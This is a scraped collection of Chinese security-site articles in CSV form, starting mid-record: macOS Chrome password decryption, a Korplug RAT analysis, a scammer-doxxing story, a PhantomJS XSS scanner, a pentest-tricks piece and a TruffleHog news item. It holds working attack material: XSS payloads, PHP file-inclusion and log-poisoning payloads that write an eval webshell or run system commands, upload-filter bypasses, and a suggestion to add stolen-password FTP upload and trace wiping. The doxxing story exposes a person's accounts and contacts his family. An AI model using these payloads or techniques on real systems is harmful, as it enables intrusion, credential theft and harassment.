Chrome”来直接调用macOS的安全处理进程，此时系统将会显示如下图所示的对话框：如上图所示，我们在没有输入用户密码的情况下获取到了Chrome的安全存储密钥。没错，就是这么简单！加密与解密之前我们也已经讨论过了，其中的AES解密密钥是通过PBKDF2密钥（‘sha1’,safeStorageKey, ‘saltysalt’, 1003）来生成的。既然我们已经获取到了这些数据，那么接下来我们怎么利用这些数据来自动化地从数据库中提取信息并解密所有的数据条目呢？没错，我们要使用的就是Python，毫无疑问，Python永远是最赞的！而且更棒的地方就在于，macOS已经帮我们安装好了Python的运行环境了，所以我们无需再去配置各种各样乱七八糟的东西了，我们可以直接在任何一台macOS设备上运行Python脚本。只需五秒钟，一切都可以搞定！如果你想要使用Python来进行AES解密的话，我们通常都会使用这个功能强大的第三方加密库来完成【传送门】，但悲剧的地方就在于，它并不是一个原生代码库。所以我打算使用OpenSSL命令行工具来发送一个采用base64编码的加密密码副本和PBKDF2解密密钥的十六进制副本。在这个过程中我还使用到了一些其他的工具，这些工具可以在我的Github代码库中获取到【传送门】。输出信息如下图所示：我们可以从上图中看到，Google并没有对这些keychain数据进行加密保护。实际上，当用户在除了Chrome浏览器以外的地方访问这些密码的时候，Google完全可以要求用户提供Keychain密码，但是很明显他们并没有这样做！如果Google想要修复这个问题的话，那么他们在最初创建安全存储密钥的时候就得要求用户输入密码以验证登录信息。除此之外，苹果公司在向开发者提供这类功能的时候，也应该谨慎考虑安全性的问题。总结各位同学可以直接使用这个程序来解密macOS平台下的Chrome密码【工具下载】。这是目前唯一一个针对macOS/OS X平台的Chrome密码解密软件，用户无需配置任何的依赖环境即可直接使用这款软件。如果你动手能力很强的话，你也可以添加一些额外的功能代码，让这款工具帮助你自动提取密码，然后将其上传至远程FTP服务器中，并清除你在目标主机中的所有操作痕迹。这样一来，它就变成了一款黑客工具了，这就是开源的魅力。","2016-10-25 16:06:32","Web安全","手把手教你解密MacOS平台下的Chrome密码","http://nsoad.com/Article/web/20161025/637.html"
"5ccbfa584f2f0a0a7a69c04d","根据我们接触到了前期入侵越南组织机构的间谍程序捕获样本，入侵活动涉及7月底对越南两大机场的攻击事件，攻击中使用的恶意软件用于窃取越南航空公司40万会员信息。这些入侵活动中使用的攻击载荷是伪装成杀","silence","根据我们接触到了前期入侵越南组织机构的间谍程序捕获样本，入侵活动涉及7月底对越南两大机场的攻击事件，攻击中使用的恶意软件用于窃取越南航空公司40万会员信息。这些入侵活动中使用的攻击载荷是伪装成杀毒软件McAfee的Korplug RAT变种。本文描述了从隐藏软件中提取最终攻击载荷的过程。1 分析样本884d46c01c762ad6ddd2759fd921bf71   – McAfee.exec52464e9df8b3d08fc612a0f11fe53b2     - McUtil.dll（shellcode loader)28f151ae7f673c0cf369150e0d44e415    – McUtil.dll.mc (shellcode)321a2f0abe47977d5c8663bd7a7c7d28  -  unpacked payload (DLL)执行流程：McAfee.exe -&gt; McUtil.dll -&gt; McUtil.dll.mc -&gt; payload (DLL)2 间谍软件包该程序是一个非常有意思的模块化软件包。它整体伪装成McAfee杀毒软件：其签名信息显示为McAfee原始的有效签名证书：这个签名证书当然不是假的，因为McAfee.exe确实是一个合法程序，但是，却被捆绑了恶意的DLL动态链接库文件，攻击者正是利用了这点进行程序劫持。攻击中使用的McAfee程序为老版本程序（编译时间为2008年），经测试，当前版本的McAfee程序不存在此类滥用隐患。3 行为分析成功植入后，程序潜伏在受害者系统中隐蔽执行。经分析发现，恶意代码注入了系统正常进程svchost.exe，程序主体启动时将会运行svchost.exe进程。从svchost.exe当前进程的详细信息中可以发现，其进程镜像目录包含恶意程序目录。恶意程序生成的bot类线程从低到高枚举本地地址空间，对局域网内其它主机进行侦察探测：同时还尝试与远程C&amp;C地址(air.dscvn.org）进行通信连接，在我们的分析测试中，该C&amp;C地址已经失效：4 解包分析恶意程序在实现最终功能之前包含多层载体，exe文件以及DLL文件都是正常的，关键的恶意功能在于包含有加密shellcode的外部捆绑文件，而在shellcode中隐藏的是执行核心间谍进程的DLL文件。shellcode加载为了达到反调试分析目的，攻击者混淆加载有效载荷的方式非常具有技巧性。McAfee.exe一旦执行，恶意程序就会在系统启动目录中加载名为McUtil.dll的动态库文件，由于系统不对恶意程序整体进行完整性检查，所以执行程序可以加载任意DLL文件：McUtil.dll被用来部署下一阶段文件：McUtil.dll.mc。为了避免分析跟踪，McUtil.dll不会直接释放文件，而是使用patch方式调用McAfee.exe读取加载。下图为向内存写入钩子加载程序的相关代码片段：以下为patch之后的程序调用代码，前两行为直接跳转到McUtil.dll地址的命令：McUtil.dll主体中包含Patch函数，并且在处于动态调用之后，所以，钩子程序加载调用返回之后便会立即执行。钩子程序调用的外部文件是可见的：当执行写入内存之后，便发生了JNZ跳转：提取payload恶意程序的shellcode被进行了复杂的混淆：重点不在于此，而在于该恶意程序的解包器和加载器，加载器把以下内容压缩到一段缓冲区内：之后逐块重新映射这些内容，并为其分配附加内存，另外，在向虚拟镜像重新映射初始PE文件的过程中，也可以看到类似情况。实际上，反编译后的解包内容为一个头部经过变形的PE可执行程序，其中PE程序原始值”MZ”被分隔符XV代替：通过重构文件头之后还原了exe文件：文件解析为一个正常的PE文件321a2f0abe47977d5c8663bd7a7c7d28，虽然程序名节都没有命名，但所有内容有效：文件特征表现了DLL形式的payload，由于文件没有任何导出列表，所以不知道它的原始名称。观察以下加载的导入部分，我们可以确定其为最终攻击载荷，它加载和调用了很多网络通信函数。例如：在对该程序进行行为分析期间，我们还找到了其执行局域网主机IP扫描的代码。攻击者为了能让攻击载荷隐秘执行，对所有调用部分进行了执行顺序检查，以下为对主要调用部分进行检查的硬编码名称：5 总结该恶意程序使用McAfee程序劫持DLL文件并运行恶意代码，为了逃避检测，还把各部分模块进行了混淆，单一的文件模块不具备恶意行为，也不能被杀毒软件查杀，只有所有部分综合执行之后才能发挥恶意行为功能。这种类型的恶意程序，其EXE或DLL文件只用来加载shellcode，并不包含恶意代码，虽然用户对PE文件的运行比较谨慎，但是这一次，可能就会比较倒霉。附录：越南CERT机构对越南航空公司被黑客攻击的通报内容2013年类似的攻击事件Korplug RAT攻击阿富汗和塔吉克斯坦BlackHat上关于Korplug RAT的分析关于NanHaiShu APT","2016-09-30 00:27:04","网络安全","解包分析攻击越南机场和其它组织机构的间谍程序解包分析攻击越南机场和其它组织机构的间谍程序","http://nsoad.com/Article/Network-security/20160930/466.html"
"5ccbfa584f2f0a0a7a69c04e","记得那一年是2012年，我当时参加了“系统管理员日”（SysAdmin Day）的比赛，还一不小心获得了冠军。主办方以漫画的形式记录下了我在比赛中讲述的求职故事（下图所示）。于此同时，主办方还给了我两张总共","silence","故事的开端记得那一年是2012年，我当时参加了“系统管理员日”（SysAdmin Day）的比赛，还一不小心获得了冠军。主办方以漫画的形式记录下了我在比赛中讲述的求职故事（下图所示）。于此同时，主办方还给了我两张总共价值500美元的苹果商店购物卡作为奖励。而正是这两张购物卡引出了接下来的一系列故事。自从拿到了那两张购物卡后，我每天都在想方设法地要用掉或卖掉它们，但“臣妾”做不到啊，因为本人不在美国。于是乎，reddit便成了我最后一根“救命稻草”。我知道在reddit上有很多骗子！不过我觉得用比特币交易应该没问题，因为骗子无法在我提供了购物码之后再把钱收回去。我跟一些有购买意向的买家聊过，但是有的买家聊了一会儿就没下文了，而且有的买家竟然想低于半价购买。你TM一定是在逗我…天空一声巨响，骗子闪亮登场在此之后，我就被骗子盯上了。我与骗子的第一次搭话是在reddit上。这位骗子的用户名因为种种原因改来改去，不过我没什么好隐瞒的，所以为了让他信任我，我就把我的真实身份告诉了他。下面是我和骗子的对话：Ungustly（骗子的昵称）：你那两张购物卡还卖吗？这是苹果商店的购物卡还是iTunes的？380美元的比特币能成交的话请私信跟我联系。我：卖啊，是苹果商店的，不过只能在美国的苹果商店使用。卡号分别是6066 XXXX XXXX 2453和6066 XXXX XXXX 2012，你可以拨打1-800-MY-APPLE验证这两张购物卡的真实性。你还可以通过以下方法核实我的身份：1、点开此链接https://www.wired.com/2015/07/proxy-services-totally-unsecure-alternatives/2、点击文中的”wrote a script that analyzed 443 open proxies” ，会跳转到我的博客3、点击“关于我”，你会看到我的个人资料。如果你能接受0.6400个比特币的价格，请转账给我，我的每篇帖子底下都有账号（1ChrisHMgr4DvEVXzAv1vamkviZNLPS7yx）。到账后我会把密码发给你。骗子：让我先给你转账？没门！我在网上交易过很多次了，而且我ebay上的好评数量已经超过150个了。我觉得，你比较像骗子吧？反正我不会先给你转账的，因为我有ebay的好评而你没有。    他不信任我，我一点也不感到奇怪，因为网上骗子确实太多了，也许我真的是其中一个呢。不过我也不相信他，说不定他的ebay账号是买来的呢。而他是这么回答我的：“ebay账号买不了。因为要实名认证，如果认证信息无法通过的话，就会被封号。这就是我的ebay账号，我可以用ebay给你发私信验证真假。”然后他就用ebay给我发了条私信，截图如下：他确实没骗我，他在ebay上的信誉极好:这两张购物卡我已经卖了四年了，现在终于可以摆脱它们了！管他呢，他应该不是骗子…吧？于是，心存侥幸的我就把两张购物卡的密码告诉了他，并且叮嘱他记得付款给我。然后他想让我把卡片寄给他，因为没有卡就无法在苹果实体店消费。然后他就给了我一个假的地址，而我就按假地址给他寄过去了。我也是服了我自己了！幸好我保留有购物卡的照片：我在把购物卡寄给他之前发了这张照片给他，照片我一直保存在PictShare上。我还给他发了物流单号。这是查询物流的网址：https://www.post.at/en/track_trace.php/details?pnum1=RS316003643AT把卡寄出去之后，我天天都在查看有没有进账记录，然而我啥也没收到…于是，我登录我的reddit准备找他算账，没想到这货竟然把他的reddit账户注销了！当时我的内心是崩溃的！好戏开始了这时我已经确定他是骗子了，于是我马上在ebay上联系他，并试图把钱要回来。Ebay上的聊天记录：我：“你好，我是reddit上的geek，我发现你的reddit账户注销了，你还没把购物卡的钱给我呢，你拿去消费了吗？”骗子：“不好意思，你是哪位？我从来不用这个账号，除了网购的时候。哦对了，我的ebay账号和电子邮箱前段时间被盗了，盗号者还用了我的PayPal和ebay。所以这不关我的事，我不会给你钱的。对于你的遭遇我只能深表同情。”我：“演得挺像那么回事啊！我给你4天时间，不把钱给我我只能告你了。”骗子：“那你告我啊！我还要告你恶意诽谤呢！我是学法律的，你别吓唬我。我压根就不认识你，更不知道你在说什么。我从来没买过你的东西。如果你再骚扰我我就要报警了！”他绝对是骗子！他的账号根本没被盗，因为我在谷歌上搜索了他在reddit和ebay上使用的昵称，发现他在Steam上用的也是这两个名字。我通过ebay找了他之后，他连ebay的昵称也改了。然后，我通过以下方式掌握了更多骗子的信息 ：1、招聘网站他之前的ebay用户名正好跟他在招聘网站上使用的用户名一样。事情发展至此，我已经得知了他的名字、他姓氏的首字母、他所居住的城市、以及他的IP地址（我还知道了他目前所在的位置）。2、他的好友我在Facebook上输入了他之前使用的ebay用户名，然后搜索到了他之前发的一条状态。但是这时还看不到他在Facebook上的个人简介，帖子也看不了，因为他的Facebook设置了隐私权限。这不要紧，因为骗子的好友所发的帖子都没有设置访问权限。我翻到了四年前的一张帖子，终于发现了跟骗子有关的信息，这简直如获至宝啊！那是一张英雄联盟的游戏截图，背景是Facebook，然后我就在截图的好友列表里发现了这个骗子，于是我就知道了他的全名。3、他的家人十分钟后，骗子全家人的Facebook简介都被我掌握了。我还在他母亲的Facebook里找到了他的照片，于是我当然要保存好了，说不定我心情好的话会报警呢！然后我添加了他还在上大学的哥哥为好友，并给骗子的哥哥和母亲留了言。内容如下：你好，我叫Christian Hasche，我是安全研究公司HascheSolution的老板。我想跟你聊聊你弟弟，他就是Reddit上的大骗子！几个星期前，他骗了我价值500美元的苹果商店购物卡。他说他要买，但在我把东西给他之后，他就注销了他的reddit账户。但我通过他的IP地址和ebay账号找到了他，现在我已经掌握了他全部的个人信息，如果要起诉他的话这些证据足够了。我知道他的IP地址、邮箱地址、steam、以及ebay等一切账号，当然，我还知道他的住址和生日。我通过各种渠道联系了他很多次，但是他死活都不承认那是他干的。他才22岁，我并不想交给警察解决，因为我在他这个年纪也干过蠢事，我不想因此毁了他的未来。我跟你联系是想问你这事该如何解决，正如我所说，我不想毁了他，但是他不能再去骗别人。我把事情的大概情况跟他哥哥说了，我并不想报警，因为这会毁了他。他的哥哥震惊了！大概十分钟后，我在reddit上收到了骗子的留言，内容如下：我是reddit上的ungustly。我为我所做的蠢事向你道歉，我只是一时糊涂。我只是一个全日制学生，也没有工作。我已经联系了苹果公司，并把购物卡要了回来。购物卡余额还有477美元，其中一张没用过，我可以把购物卡还给你。但求你不要难为我，我再也不会干这种蠢事了，我真的觉得很后悔。其实我并没有比特币，要是我有的话我早就给你了。我是个普通的大学生，我真的一毛钱存款都没有。求你放过我！这几天我因为这件事还得了焦虑症，我真的很害怕。我现在只求你放过我，我真的知道错了。我再也不会干这种蠢事了。如果我有钱我会马上给你，但是我现在真的没有。因为我每天都得上课，所以没法工作，我是真的很穷，穷得只能吃廉价的快餐。我请求你原谅我，并把购物卡收下，我真知道错了！从他的留言内容看来，他貌似真的被吓坏了。他想把购物卡还给我，可是我想摆脱那两张购物卡已经好几年了，我才不想要回来。所以我让他把购物卡卖掉，然后再把钱给我。最后他照做了，我俩的交易就此结束啦！我说过我不会报警，但要是被我发现他又去祸害别人，那我肯定会毫不留情地揭发他。后来他又给我留言了：我再次向你道歉，也要感谢你。另外，我想拜托你删掉我家人和我朋友的联系方式，我哥因为这件事气炸了。趁我妈还没看到你给她的留言，拜托你删掉吧，求求你啦！我觉得，他应该有阴影了，他应该不敢再去骗别人了。经验总结：1、你的社交媒体账号也许设置了隐私访问权限，但你的好友却不一定设置了。所以这个功能只有当你和你的好友都设置正确的时候，才能发挥其最大功效；2、不要在网上使用相同的用户名；3、如果想要通过比特币交易的话，尽量使用中介服务； * 参考来源：haschek，本文由Alpha_h4ck编译，转载请注明来自FreeBuf（Freebuf.COM）","2016-09-15 13:55:22","网络安全","社工案例：骗子骗了我500美元，最后却求我不要告诉他父母","http://nsoad.com/Article/Network-security/20160915/399.html"
"5ccbfa584f2f0a0a7a69c04f","[+] Author: fridayy[+] Team: n0tr00t security team[+] From: http://www.n0tr00t.com[+] Create: 2016-10-29XSS 是典型的浏览器端漏洞，由于用户的输入未经转义直接输出","Kong","[+] Author: fridayy[+] Team: n0tr00t security team[+] From: http://www.n0tr00t.com[+] Create: 2016-10-29XSS 是典型的浏览器端漏洞，由于用户的输入未经转义直接输出到页面中，恶意代码在用户的浏览器中被解析，从而造成危害。传统的反射型 XSS 可以通过判断页面源码是否含有特定字符串来检测。但由于 Web 2.0 的快速发展交互越来越复杂，DOM-XSS 也层出不穷，导致传统的检测方案的漏报率很高。本文主要介绍了如何利用 PhantomJS + Python 完成动态检测。0x01 PhantomJS既然是动态检测，那么就需要一个浏览器，但普通的浏览器在渲染页面上花费了太多的资源和时间，并不适用。怎么办？当然开源世界早有解决方案：PhantomJS、PyQt、CEF 等等。对比了一下上手难易程度、文档丰富程度等，我选择了 PhantomJS 进行开发。PhantomJS 是无界面的 Webkit 解析器，提供了 JavaScript API 。由于去除了可视化界面，速度比一般 Webkit 浏览器要快很多。同时提供了很多监控和触发接口，可以方便的操作页面 DOM 节点，模拟用户操作等。0x02 漏洞判别标准XSS 漏洞说到底还是用户输入被当成页面代码解析了，解析的结果可能是执行了JS代码，也可能是在页面中创建/修改了某个 DOM 节点(有部分过滤，无法执行JS代码的情况下)。所以我们将 Payload 大概分为两类：第一类，执行了指定的JS代码（alert(1)）第二类，创建了新的DOM节点（&lt;xsstest&gt;&lt;/xsstest&gt;）。根据这两种 Payload ，简化的漏洞判别标准如下：页面弹窗（在PhantomJS中重载window.alert）新节点（解析玩页面后，判断document.getElementsByTagName('xsstest')是否为空）。page.onAlert = function (message) {      if(message == xss_mark) {        xss_exists = 1;        ret = ""Success, xss exists"";        phantom_exit(ret);     }    console.log('Alert: ' + message);    return true;};function check_dom_xss_vul(){      return document.getElementsByTagName(dom_xss_mark).length;}为了验证检测代码，编写一个简单存在XSS漏洞的页面。&lt;?php  echo $_GET['test'];  ?&gt;经测试，访问 http://127.0.0.1:8000/xss.php?test=&lt;img src=1 onerror=alert(1)&gt;，我们的检测代码成功检测到了弹窗，并返回了正确的结果。但是，如果是下面这种情况呢？&lt;?php  $click = $_GET['test'];echo ""&lt;div onclick=$click&gt;&lt;/div&gt;"";  ?&gt;0x03 执行事件代码很明显，我们需要执行onclick中的代码，才能检测到漏洞。首先我们想到的是触发事件，仅仅是触发 click 事件： document.getElementsByTagName('div')[0].click()。但是 Javascript 也就仅仅提供了 click 事件的触发函数而已。既然代码直接输出在了 onclick/onmouseover 之类的属性里，我们遍历所有节点的属性，针对 onxxxxx 的属性值，直接调用 eval 方法，执行对应的代码就可以了。var nodes = document.all;  for(var i=0;i&lt;nodes.length;i++){      var attrs = nodes[i].attributes;    for(var j=0;j&lt;attrs.length;j++){        attr_name = attrs[j].nodeName;        attr_value = attrs[j].nodeValue;        if(attr_name.substr(0,2) == ""on""){            console.log(attrs[j].nodeName + ' : ' + attr_value);            eval(attr_value);        }    }}访问 http://127.0.0.1:8000/xss.php?test=alert(1) 成功执行代码，但新的问题很快出现：并不是所有的JS代码都是以内联的形式写入到 HTML 代码中的，程序猿们往往更喜欢通过 document.addEventListener 或者 jQuery 中的 $('dom').click 直接绑定事件。例子如下：&lt;script type=""text/javascript"" src=""http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js""&gt;&lt;/script&gt;&lt;div class=""link-area""&gt;&lt;/div&gt;&lt;?php  echo '&lt;script&gt;$(""#image"").click(function(){$("".link-area"").html(""'.$_GET['test'].'"")});&lt;/script&gt;';  ?&gt;0x04 触发事件所以我们现在需要这样的接口：能够触发某个 DOM 节点的某个事件，包括但不仅限于 click 事件。 PhantomJS 和 JavaScript 都可能存在这样的接口，但是找遍了 PhantomJS 的接口，也只是发现了触发 click 事件的接口。所以聚焦点重新回到 Javascript 上来。很快我发现了 dispatchEvent 这个函数。// phantom_finish.jsvar evt = document.createEvent('CustomEvent');  evt.initCustomEvent(click, true, true, null);  document.getElementsByTagName(""div"")[0].dispatchEvent(evt);  成功执行了 click 事件，但是如何能获取到所有节点的绑定事件呢？有两种方法：遍历所有节点，获取每个节点绑定的事件在dom节点加载前，重写addEventListener方法，并将所有的绑定的事件及节点记录下来。方法一在遇到 jQuery 绑定事件的时候扑街了。方法二明显比方法一节省资源，并且测试通过：// phantom_init.js_addEventListener = Element.prototype.addEventListener  Element.prototype.addEventListener = function(a,b,c) {          save_event_dom(this, a);      // 将所有的绑定事件节点信息存储起来        _addEventListener.apply(this, arguments);};这样，我们的 JS 代码也算告一段落，PhantomJS 组件能够执行内联代码及触发所有的绑定事件。万事具备，只欠一个调度系统了~0x05 调度系统XSS 扫描是 URL 粒度扫描，针对网站的每一个链接(去重后)都要进行测试。XSS检测系统的输入值包括：* URL （如：http://127.0.0.1:8000/xss.php?a=1&amp;b=2）* method* post_data* headers调度系统的功能就是处理这个URL，拼接对应的payload，并调用 PhantomJS 组件，检测是否含有 XSS 漏洞。举个例子，当payload为 &lt;img src=1 onerror=alert(1)&gt; 时，需要调用两次 PhantomJS 组件，输入的URL分别为：http://127.0.0.1:8000/xss.php?a=&lt;img src=1 onerror=alert(1)&gt;&amp;b=2http://127.0.0.1:8000/xss.php?a=1&amp;b=&lt;img src=1 onerror=alert(1)&gt;当然 Payload 不止一个，会有很多种玩法，简单提供几个基础 Payload ：'""&gt;&lt;img src=1 onerror=alert(1)&gt;'""&gt;&lt;script&gt;alert(1)&lt;/script&gt;';alert(1)//"";alert(1)//'"" onmouseover=alert(1)javascript:alert(1)'""&gt;&lt;/script&gt;&lt;img src=1 onerror=alert(1)&gt;""'&gt;&lt;/textarea&gt;&lt;xsstest&gt;0x06 更多思考采用了 Webkit 解析器来检测XSS漏洞，提高了检测的覆盖率，也大幅降低了误报率。但有些仅在 IE 下有效的漏洞，就无法覆盖到了。上述种种，已经基本将动态XSS检测的思路分析透彻。XSS有很多种玩法，在payload中可以带进一些有意思的攻击代码，比如钓鱼、打Cookie(配合XSS平台)、甚至探测网络状况等等不再赘述。","2016-10-30 02:22:00","Web安全","XSS dynamic detection using PhantomJs","http://nsoad.com/Article/web/20161030/666.html"
"5ccbfa584f2f0a0a7a69c050","前言：总结下渗透测试中的一些小技巧，仅做总结。目录：0x01 php文件包含姿势","Kong","前言：总结下渗透测试中的一些小技巧，仅做总结。目录：0x01 php文件包含姿势 0x02 .htaccess文件突破黑名单解析 0x03 php流封装绕过截断 0x04 通用防注入系统getshell 0x05 iis+php黑名单上传突破正文0x01 php文件包含姿势其实这类姿势国外黑阔早有总结：includinguploaded files -straight forward method; this requires existence of an upload functionality inthe tested website (e.g. photo upload, or document upload), access to uploadfunctionality and storage of uploaded files in a place accessible by the PHPscript （如果网站存在文件上传功能，比如前台传头像之类，可以尝试包含上传的文件，当然文件可控。）include data://or php://input pseudo protocols - these protocols must be enabled andaccessible via include (allowurlinclude set to on); also, php://filter pseudo protocol is usable in somecases （利用php封装协议php://input和data://，包含post数据造成php命令执行，当然allowurlinclude选项需要打开）including logs - this required PHP script to be ableto access certain types of logs, e.g. httpd server error logs or access logs;also, size of these logs might make the attack harder (e.g. if error log has2GB) （因为包含的可以是任意文件，log文件也是可以，当我们提交恶意代码时也会被记录，于是包含记录了恶意代码的log文件是个好主意）including /proc/self/environ - this requires PHP to be run as CGIon a system that hasthe /proc pseudo-filesystem and PHP script is required to have access to theaforementioned pseudo-file （包含/proc/self/environ文件： 这需要PHP运行作为一个具有cgion /proc伪文件的系统且PHP脚本有权访问这些伪文件）include session files - this requires the attacker to beable to influence the value of any string in a session (to inject code, e.g.), the sessions must be stored in a serializedsession file (as e.g. x| s:19:""""; - this isthe default setting for PHP) and the PHP script must be able to access thesession file (usually names /tmp/ sessSESSIONID) （包含会话文件-这需要攻击者能控制会话中的任何字符串值（注入代码，例如phpinfo(）），会话文件必须存放在serializedsession文件且PHP脚本能够访问会话文件（通常是/tmp/ sessSESSIONID文件）include other files created by PHPapplication - thisis very application and system specific, but it basically describes any otherfile that is created the websites functionality and the way it works, e.g.database files, cache files, application-level logs, etc Additional toolsincluded both the poison nul byte (addressed in PHP 5.3.4[1] released2010-12-09) and excessive slash (/) suffix into path truncation bug[2] (patchedin 2009).（包含其他由php应用创建的文件，只要你能想到的，都可以尝试创建 然后包含他，比如数据库文件，缓存文件，应用程序级别的日志）我们来主要说下第二种和第三种姿势 php://input属于php内置的封装协议，其实都主要是include（）函数处理不当 这里我们准备一个有文件包含的php文件&lt;?php    include($_GET['url']); ?&gt;我们访问 http://127.0.0.1/111332.php?url=php://input 然后我们通过POST提交php代码。 黑阔可利用此写入一句话木马：&lt;?php fwrite(fopen(""xxx.php"",""w""),'&lt;?php eval($_POST[""cc""]);?&gt;');?&gt;  同理，提交：&lt;?php system(""net user"")?&gt;  可成功通过system函数成功执行命令。第三种姿势也是比较巧妙：包含日志文件getshell（需要一定读权限）首先找到日志文件存放位置，利用文件包含漏洞去读取 apache 日志默认在 /etc/httpd/logs/access_log也可以先找apache配置文件，通过任意文件读取漏洞配置文件找到日志路径 /etc/httpd/conf/httpd.conf让日志文件插入php代码方法一 使用burpsuit抓包访问 ，绕过浏览器编码&lt;&gt;方法二 curl 访问不存在的urlcurl http://192.168.192.1/a.php?=&lt;?php phpinfo(); ?&gt;  如此，php代码就被写到log里面了 包含一下日志：http://172.16.77.145/lfi/1/index.php?page=/etc/httpd/logs/access_log0x02 .htaccess文件突破黑名单解析因为是黑名单，自定义.htaccess上传，下面是内容&lt;FileMatch “test.jpg”&gt;  SetHandler application/x-httpd-php  &lt;/FileMatch&gt;  同目录下，上传一个test.jpg文件，没有扩展名，内容是一句话，这个时候就成功绕过。0x03 php流封装绕过截断思路源于王松童鞋 @王松_striker 思路主要是利用了PHP的一个流封装的特性,可以参考PHP官方文档中的Example #3Example #3 Zip 流封装，读取一个OpenOffice 文件的元信息&lt;?php  $reader = new XMLReader(); $reader-&gt;open('zip://' . dirname(__FILE__) . '/test.odt#meta.xml');$odt_meta = array();while ($reader-&gt;read()) {      if ($reader-&gt;nodeType == XMLREADER::ELEMENT) {        $elm = $reader-&gt;name;    } else {        if ($reader-&gt;nodeType == XMLREADER::END_ELEMENT &amp;&amp; $reader-&gt;name == 'office:meta') {            break;        }        if (!trim($reader-&gt;value)) {            continue;        }        $odt_meta[$elm] = $reader-&gt;value;    }}print_r($odt_meta);  ?&gt;此例使用了旧的 API（PHP 4），它打开了一个 ZIP 文件归档，读取归档里的每个文件，并输出文件内容。此例用到的 test2.zip 文档是 ZZIPlib 源分布里测试文档中的一个。 假设存在文件包含的代码为：&lt;?php    $a = $_GET['file'];  include $a.'.html.php';  但是我们%00无法截断, 只能包含 xxxx.html.php 首先我们新建一个hello.html.php，内容为phpinfo();然后压缩成zip,结构如下图：然后访问如下网址,成功包含压缩文件内的hello.html.php http://localhost/test/blog.php?file=zip://test.zip%23hello如图：把我们输入的变量和include后面的变量合起来就是 zip://test.zip#hello.html.php代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。0x04 通用防注入系统getshell相信许多朋友渗透测试都遇到过这种情况系统做了数据提交记录，我们通过阅读类似程序的源码得知数据记录在sqlin.asp于是想到直接提交一句话木马。但是没有成功┼攠數畣整爠煥敵瑳∨≡┩愾           密码 a  (加密方式是:ANSI-&gt;Unicode)提交 and 1= ┼攠數畣整爠煥敵瑳∨≡┩愾菜刀连接sqlin.php即可0x05 iis+php黑名单上传突破环境: php+window+iis局限: 文件上传黑名单机制，略显鸡肋科普： 在php+window+iis环境下:双引号(“&gt;”) &lt;&gt; 点号(“.”)’;大于符号(“&gt;”) &lt;&gt; 问号(“?”)’;小于符号(“&lt;“) &lt;==&gt; 星号(“*”)’;有这么好玩的东西，那不就可以做太多的事了？但事实并不是这样，通过一系列的测试发现，该特性只能用于文件上传时覆盖已知的文件，于是这特性便略显鸡肋.不过P牛已经给出完美利用的方法：思路如下：首先我们先利用特殊办法生成一个php文件，然后再利用这个特性将文件覆盖..可问题又来了，怎样生成php文件呢?如果可以直接生成php文件的话，干嘛还要利用那什么特性?别急，办法总是有的..我们都知道在文件上传时，我们往往会考虑到文件名截断，如%00 等..对！有的人可能还会用冒号(“:”)去截断，如：bypass.php:jpg但是你知道吗?冒号截断产生的文件是空白的，里面并不会有任何的内容,呵呵说到这里明白了没有? 虽然生成的php文件里面没有内容，但是php文件总生成了吧，所以我们可以结合上面所说的特性完美成功利用.按照上面提供的思路，实现..本地测试地址：http://.../upfile.php 环境：Windows+IIS7.51)首先利用冒号生成我们将要覆盖的php文件，这里为：bypass.php，如图点击forward后，可以看见成功生成空白的bypass.php文件2)利用上面的系统特性覆盖该文件 从上面已经知道“&lt;” 就等于 “”,而””代码任意字符，于是乎..我们可以这样修改上传的文件名，如下：------WebKitFormBoundaryaaRARrn2LBvpvcwK&lt;/pre&gt;Content-Disposition: form-data; name=""file""; filename=""bypass.&lt;&lt;&lt;""    Content-Type: image/jpeg    //注意！文件名为：bypass.&lt;&lt;&lt;点击go..,即可成功覆盖bypass.php文件，如图对比上面的两个图，bypass.php被我们成功的写入了内容..","2016-10-29 15:42:46","Web安全","盘点那些渗透测试中的奇淫技巧","http://nsoad.com/Article/web/20161029/661.html"
"5ccbfa584f2f0a0a7a69c051","一款免费开源的工具“TruffleHog”，可以帮助开发人员检测他们在GitHub上发布的项目是否已经不小心泄漏了任何秘密密钥。","小二郎","一款免费开源的工具“TruffleHog”，可以帮助开发人员检测他们在GitHub上发布的项目是否已经不小心泄漏了任何秘密密钥。“TruffleHog”是研究人员Dylan Ayrey发布的一个用来搜索存储库的Python工具，可以帮助管理员深入研究GitHub Commits（提交），找到高熵密钥，从而避免管理员暴露他们的敏感数据。TruffleHog的工作原理Ayrey表示，“TruffleHog”通过GitHub存储库搜索高熵（high-entropy）字符串，深入挖掘提交历史（Commit History）和分支（Branch）。他解释称，这款工具将定位任何超过20个字符串的高熵密钥。该工具可以搜索分支的整个提交历史，检查Commit中的每个diff，评估base64字符集的ShannonEntropy。此外，还对blob进行评估（每个大文本超过20个字符，且每个Diff中包含这些字符集）的Shannon Entropy。这款工具能有效找到不小心提交的高熵密钥。如果检测到高熵字符串超过20个，将打印到屏幕上。Reddit用户在讨论TruffleHog时指出，机器人经常通过扫描GitHub寻找AWS密钥，而这类活动经常会导致大量资产损失。据悉，目前Amazon已经在搜索GitHub AWS密钥，并会在发现密钥时暂时关闭相应服务。该工具的开发者Dylan Ayrey曾因去年的“粘贴劫持（Pastejack）”而出名，他提供了演示视频，展示了攻击者运行恶意代码、清除控制台并附加用户复制的代码的全过程。这种攻击可以使用CSS附加恶意内容至剪贴板，而不必通知用户，最终诱骗他们执行不需要的终端命令。目前“TruffleHog”在GitHub中的星数已经超过了700，成为Ayrey继“Pastejack”之后第二个受欢迎的项目。安全专家经常警告开发人员，在GitHub上发布项目存在泄漏敏感数据的风险。2013年1月，GitHub推出新的内部搜索功能，可以轻松查找密码、加密密钥和其它数据。当时，用户在GitHub上发现了几千个这样的隐私数据。最近，专家警告Slack Bot的开发人员，他们在GitHub上发布Slack访问令牌，但却不知不觉地泄漏了敏感数据，包括商业关键信息。TruffleHog下载地址","2017-01-14 19:26:57","安全工具","TruffleHog：一款帮助开发者检测软件安全性的工具","http://nsoad.com/Security-tools/20170114/tools-1021.html"
